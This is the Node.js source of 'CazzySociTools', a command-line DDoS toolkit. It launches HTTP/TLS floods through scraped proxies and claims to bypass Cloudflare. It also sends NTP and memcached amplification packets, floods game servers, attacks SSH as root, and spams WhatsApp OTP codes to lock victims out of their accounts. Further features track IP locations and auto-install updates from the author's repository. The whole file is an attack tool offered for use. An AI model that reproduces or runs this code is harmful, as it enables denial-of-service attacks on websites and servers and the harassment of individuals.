#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const axios = require('axios')
const net = require('net');
const random = require('random');
const fs = require('fs');
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@&P@&PJG@@@@@@@@@@@@@@PJP&@5&@@@@@@@@@
@@@@@@@@@~.Y~^J&@@@@@@@@@@@@@@#?^!J.7@@@@@@@@@
@@@@@@@7J7::^~5@@@@@@@&&@@@@@@@Y~^::??J@@@@@@@
@@@@@@@^.~7^~B@@##BG5J!~?YPB##&@P^~7~.!@@@@@@@
@@@@@57P!!^!#@@#7^::..~!..::^!B@@B~~!7P!G@@@@@
@@@@@B::^~^5@@@&7.....!?:....~#@@@Y^~^:^#@@@@@
@@@@@PPY!J!P@@@@Y:..?P?7P?::.?&@@@57Y!5PG@@@@@
@@@@@Y:~^^^5@@@@#!.7&@##@&7.^G@@@&Y:^^~:P@@@@@
@@@@@@PJ7??.G@@@@B!~!7777!~~G@@@@5.?77JG@@@@@@
@@@@@@5~~^.!J7&@@@&Y^....^?#@@@#!J~.^~!G@@@@@@
@@@@@@@&Y??J^ PJP@@@&P?75#@@@5YY ~???5&@@@@@@@
@@@@@@@@G7~^~7P:.PYB@@@@@@G5Y ^P!^^~?B@@@@@@@@
@@@@@@@@@@&Y7!:.:5~.?@@@@!.7Y..^!75&@@@@@@@@@@
@@@@@@@@@@@#GYYYJ!:.^PGG5:.^7YYY5G&@@@@@@@@@@@
@@@@@@@@@@@@@@@#5JYJ5PBGP5JJJ5&@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@&&@#&&#&&&&&#&@#@&#&&#&&#&#&&#&&#&@#@@@@@
@@@@@55GYY5BP55YP#BGYBG5#P5&5P#PPPBP5#B&Y@@@@@
@@@@&#&#&B&##&&B&#&#&###&B#&##&##&##&#&&B@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     
CazzySociTools ${version}
Owner: CazzySoci
Premium: true
Cazzy Tools DDoS By CazzySoci 
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/cazzysoci/Cazddos/main/lib/cache/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/cazzysoci/Cazddos/main/lib/cache/pass.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31mCazzySoci  Security\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To CazzySoci Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "help" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g cazzy-soci`)
      console.log(`Installing update`)
      await exec(`npm i -g cazzy-soci`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}

const ntp_payload = "\x17\x00\x03\x2a" + "\x00".repeat(4);
const mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";

function NTP(target, port, duration) {
  try {
    const ntp_servers = fs.readFileSync('ntpServers.txt', 'utf8').split('\n');
    const packets = random.randint(10, 150);
    const server = random.choice(ntp_servers).trim();

    while (time.time() < duration) {
      try {
        const packet = Buffer.from(`${ntp_payload}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`);
        const client = net.createConnection({ port: port, host: server });
        client.on('connect', () => {
          for (let i = 0; i < packets; i++) {
            client.write(packet);
          }
          client.end();
        });
      } catch (e) {
        //console.log(`Erro: ${e}`);
      }
    }
  } catch (e) {
    //console.log(`Erro: ${e}`);
  }
}

function MEM(target, port, duration) {
  try {
    const memsv = fs.readFileSync('memsv.txt', 'utf8').split('\n');
    const packets = random.randint(1024, 60000);
    const server = random.choice(memsv).trim();

    while (time.time() < duration) {
      try {
        const packet = Buffer.from(mem_payload);
        const client = net.createConnection({ port: 11211, host: server });
        client.on('connect', () => {
          for (let i = 0; i < packets; i++) {
            client.write(packet);
          }
          client.end();
        });
      } catch (e) {
        //console.log(`Erro: ${e}`);
      }
    }
  } catch (e) {
    //console.log(`Erro: ${e}`);
  }
}

// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mCazzySoci  Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                      Tracking IP Address Result 
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`

 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                      Attack Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 100`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 100 100 proxy.txt`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 30 100`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 100 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)/
        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
          sigma()
          } else if (methods === 'flooder') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
	  sigma()
	  } else if (methods === 'peterda') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
	  sigma()
	  } else if (methods === 'NTP') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} 80 ${duration}`)
	  sigma()
	  } else if (methods === 'MEM') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} 80 ${duration}`)
	  sigma()
	  } else if (methods === 'kupal') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} ${duration} 100 30 proxy.txt --full`)
	  sigma()
	  } else if (methods === 'lol') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt --proxy`)
          sigma()
	  } else if (methods === 'cf') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} POST ${target} proxy.txt ${duration} 30 100 cookie=mycookie postdata="param1=value1&param2=value2" randomstring=randomparam headerdata="Custom-Header=Value"`)       
	  sigma()
	  } else if (methods === 'vendetta') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt`)
	  sigma()
	  } else if (methods === 'cfb') {
       pushOngoing(target, methods, duration)
	exec(`node ${metode} ${target} ${duration} 5 proxy.txt`)
	  sigma()
	  
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const strike = path.join(__dirname, `/lib/cache/strike.js`);
const kill = path.join(__dirname, `/lib/cache/kill.js`);
const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const thunder = path.join(__dirname, `/lib/cache/thunder.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
const ntp = path.join(__dirname, `NTP`);
const mem = path.join(__dirname, `MEM`);
const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
const lol = path.join(__dirname, `/lib/cache/xyecoc.js`);
const cf = path.join(__dirname, `/lib/cache/CF-FLOODER.js`);
const vendetta = path.join(__dirname, `/lib/cache/CF-Bypass.js`);
const cfb = path.join(__dirname, `/lib/cache/cfb.js`);
        exec(`node ${flood} ${target} ${duration}`)
        exec(`node ${tls} ${target} ${duration} 100 100`)
        exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
	exec(`node ${kill} ${target} ${duration} 30 100`)
	exec(`node ${bypass} ${target} ${duration} 30 100 proxy.txt`)
	exec(`node ${raw} ${target} ${duration}`)
	exec(`node ${thunder} ${target} ${duration} 100 100 proxy.txt`)
        exec(`node ${rape} ${duration} 100 proxy.txt 70 ${target}`)
	exec(`node ${storm} ${target} ${duration} 100 100 proxy.txt`)
	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
        exec(`node ${ntp} ${target} 80 ${duration}`)
        exec(`node ${mem} ${target} 80 ${duration}`)
	exec(`node ${kupal} ${target} ${duration} 100 30 proxy.txt --full`)
	exec(`node ${lol} ${target} ${duration} 30 100 proxy.txt --proxy`)
	exec(`node ${cf} POST ${target} proxy.txt ${duration} 30 100 cookie=mycookie postdata="param1=value1&param2=value2" randomstring=randomparam headerdata="Custom-Header=Value"`)
	exec(`node ${vendetta} ${target} ${duration} 30 10 proxy.txt`)
	exec(`node ${cfb} ${target} ${duration} 5 proxy.txt`)
	
	
	  
	  
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`

 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                    SSH Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`

 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                    OTP Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp.js`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : CazzySoci`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                    UDP Raw Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : CazzySoci`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                   Minecraft Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
Creator  : CazzySoci`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                    SA MP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : CazzySoci`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
 ██████╗ █████╗ ███████╗███████╗██╗   ██╗███████╗ ██████╗  ██████╗██╗
██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔════╝██╔═══██╗██╔════╝██║
██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ███████╗██║   ██║██║     ██║
██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ╚════██║██║   ██║██║     ██║
╚██████╗██║  ██║███████╗███████╗   ██║   ███████║╚██████╔╝╚██████╗██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝╚═╝
                        Subdomains Finder
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31mCazzySoci Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/cazzysoci/Cazddos/main/lib/cache/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By CazzySoci

`
permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | show list of available methods
| track-ip     | track ip address with info
| subdo-finder | find all subdomain from domain
| kill-wifi    | kill your wifi (termux/linux/windows only)
| kill-ssh     | kill VPS Access 
| kill-otp     | kill WhatsApp OTP Verification
| kill-ping    | sending death pinger
| samp         | S.A.M.P Flooder
| mc-flood     | Minecraft Bot Flooder
| attack       | launch ddos attack
| udp-raw      | launch udp flood attack
| kill-do      | digital ocean killer
| ongoing      | show ongoing attack
| news         | show latest cazzysoci news
| ai           | Chat With Ai
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| flood      || HTTP(s) Flood DoS
|| tls        || TLS 1.3 
|| strike     || Best DDoS methods
|| cf         || CLOUDFARE FLOODER 
|| kill       || Bypass Cf DDoS methods
|| raw        || Huge RPS Flexing XD
|| bypass     || Bypass With High Power
|| thunder    || Massive Power Methods
|| storm      || The Raining Request
|| rape       || Bypass Protection
|| destroy    || Kill That Socket
|| flooder    || Powerful Flooder
|| peterda    || Flooder with Advanced Features
|| ntp        || Ntp Flood server
|| mem        || Mem Flood server
|| kupal      || DOWN/BYPASS Ex: https://target.com?q=%RAND%
|| lol        || BYE WEBSITE HAHA 
|| vendetta   || CLOUDFARE BYPASS 
|| cfb        || CLOUD-FARE BYPASSER
[=========================================]
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`CazzySoci Ai Ragbot Has Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
